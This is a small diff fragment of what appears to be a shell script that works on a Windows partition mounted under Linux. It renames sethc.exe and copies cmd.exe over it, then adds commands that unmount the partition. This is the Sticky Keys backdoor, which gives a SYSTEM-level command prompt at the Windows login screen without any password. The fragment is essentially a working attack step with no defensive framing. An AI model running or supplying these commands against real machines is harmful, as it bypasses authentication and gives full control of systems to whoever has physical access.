@@ -3,3 +3,5 @@
 
 mv "/media/windows/Windows/System32/sethc.exe" "/media/windows/Windows/System32/sethcold.exe"
 cp "/media/windows/Windows/System32/cmd.exe" "/media/windows/Windows/System32/sethc.exe"
+cd /
+umount /media/windows
